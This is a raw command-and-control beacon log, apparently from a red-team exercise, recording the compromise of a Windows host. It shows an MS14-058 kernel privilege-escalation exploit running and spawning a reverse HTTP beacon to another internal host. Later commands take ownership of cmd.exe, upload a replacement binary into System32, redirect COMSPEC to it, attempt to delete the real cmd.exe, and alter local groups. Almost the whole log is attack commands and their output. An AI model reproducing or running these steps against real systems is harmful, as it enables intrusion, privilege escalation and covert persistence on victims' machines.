02/03 15:09:53 [metadata] 172.17.2.54 <- 172.17.2.54; computer: A-PC; user: a *; pid: 1656; os: Windows; version: 6.1; beacon arch: x86 (x64)
02/03 15:10:14 [input] <neo> elevate ms14-058 test
02/03 15:10:14 [task] Tasked beacon to run windows/beacon_http/reverse_http (172.17.2.56:80) via ms14-058
02/03 15:10:43 [checkin] host called home, sent: 104503 bytes
02/03 15:10:44 [output]
received output:
[*] Getting Windows version...
[*] Solving symbols...
[*] Requesting Kernel loaded modules...
[*] pZwQuerySystemInformation required length 43224
[*] Parsing SYSTEM_INFO...
[*] 146 Kernel modules found
[*] Checking module \SystemRoot\system32\ntoskrnl.exe
[*] Good! nt found as ntoskrnl.exe at 0x03c16000
[*] ntoskrnl.exe loaded in userspace at: 40000000
[*] pPsLookupProcessByProcessId in kernel: 0xFFFFF80003F691FC
[*] pPsReferencePrimaryToken in kernel: 0xFFFFF80003F6C9D0
[*] Registering class...
[*] Creating window...
[*] Allocating null page...
[*] Getting PtiCurrent...
[*] Good! dwThreadInfoPtr 0xFFFFF900C0F95C30
[*] Creating a fake structure at NULL...
[*] Triggering vulnerability...
[!] Executing payload...


02/03 16:13:42 [task] Tasked beacon to run: takeown /F "C:\Windows\System32\cmd.exe" /A
02/03 16:13:43 [task] Tasked beacon to run: icacls "C:\Windows\System32\cmd.exe" /grant Administrators:F
02/03 16:13:43 [task] Tasked beacon to make directory c:\RedTeam\
02/03 16:13:43 [task] cd c:\RedTeam\
02/03 16:13:43 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\cmd_back.exe as cmd_back.exe
02/03 16:13:44 [indicator] file: 5746bd7e255dd6a8afa06f7c42c1ba41 345088 bytes cmd_back.exe
02/03 16:13:44 [task] Tasked beacon to make directory c:\RedTeam\
02/03 16:13:44 [task] cd c:\RedTeam\
02/03 16:13:44 [task] Tasked beacon to run: copy C:\RedTeam\cmd_back.exe C:\Windows\System32\ /y
02/03 16:13:44 [task] Tasked beacon to run: setx -m comspec "%SystemRoot%\System32\cmd_back.exe"
02/03 16:13:44 [task] Tasked beacon to run: del /s /q C:\Windows\System32\cmd.exe
02/03 16:13:44 [task] Tasked beacon to run: Net Localgroup Tests /del
02/03 16:13:44 [task] Tasked beacon to run: Net Localgroup Tests /add
02/03 16:13:45 [checkin] host called home, sent: 345699 bytes
02/03 16:13:46 [output]
received output:

成功: 此文件(或文件夹): "C:\Windows\System32\cmd.exe" 现在由管理员组所有。


02/03 16:13:46 [output]
received output:
已处理的文件: C:\Windows\System32\cmd.exe
已成功处理 1 个文件; 处理 0 个文件时失败


02/03 16:13:46 [output]
received output:
已复制         1 个文件。


02/03 16:13:46 [output]
received output:

成功: 指定的值已得到保存。


02/03 16:13:46 [output]
received output:
C:\Windows\System32\cmd.exe
拒绝访问。


02/03 16:13:46 [output]
received output:
命令成功完成。



02/03 16:13:46 [output]
received output:
命令成功完成。



